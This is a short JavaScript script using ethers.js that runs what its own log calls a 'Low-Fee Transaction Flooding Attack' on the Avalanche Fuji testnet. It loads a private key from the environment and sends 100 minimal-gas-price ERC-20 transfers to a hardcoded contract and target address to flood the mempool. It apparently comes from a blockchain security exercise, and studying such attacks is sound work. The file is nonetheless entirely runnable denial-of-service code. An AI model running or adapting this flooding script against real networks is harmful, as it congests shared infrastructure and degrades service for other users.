import { ethers } from "ethers";
import dotenv from "dotenv";
import contractABI from '../ddos-attack/src/contractABI.json' assert { type: "json" };

dotenv.config();

// Avalanche Fuji Testnet RPC endpoint
const rpcUrl = "https://api.avax-test.network/ext/bc/C/rpc";

// Provider and wallet setup
const provider = new ethers.JsonRpcProvider(rpcUrl);
const privateKey = process.env.PRIVATE_KEY; // Load private key from .env file
const wallet = new ethers.Wallet(privateKey, provider);

// Smart contract details
const contractAddress = "0x1aaed6e4397b8142d5b563be20e332f01e5e8935";
const targetAddress = "0x5b61A4C1a86a4CBAc5b31909282A3495FE145bBE";
const contract = new ethers.Contract(contractAddress, contractABI, wallet);

// Attack parameters
const numTransactions = 100; // Number of transactions to flood
const gasPrice = ethers.parseUnits("1", "gwei"); // Minimal gas price

async function floodMempool() {
    console.log("Starting Low-Fee Transaction Flooding Attack...");
    let nonce = await provider.getTransactionCount(wallet.address, "pending");

    for (let i = 0; i < numTransactions; i++) {
        try {
            const tx = {
                to: contractAddress,
                gasLimit: 70000, // Adjust gas limit for ERC-20 transfer
                gasPrice: gasPrice,
                nonce: nonce + i,
                data: contract.interface.encodeFunctionData("transfer", [targetAddress, ethers.parseUnits("1", "ether")]), // Sends 1 token
            };

            // Sign and send the transaction
            const response = await wallet.sendTransaction(tx);

            console.log(`Transaction ${i + 1} sent:`, response.hash);

            // Wait for transaction confirmation
            const receipt = await response.wait();
            if (receipt.status === 1) {
                console.log(`Transaction ${i + 1} confirmed:`, response.hash);
            } else {
                console.log(`Transaction ${i + 1} reverted:`, receipt);
            }
        } catch (error) {
            console.error(`Error in transaction ${i + 1}:`, error.message);
        }
    }
}

floodMempool();
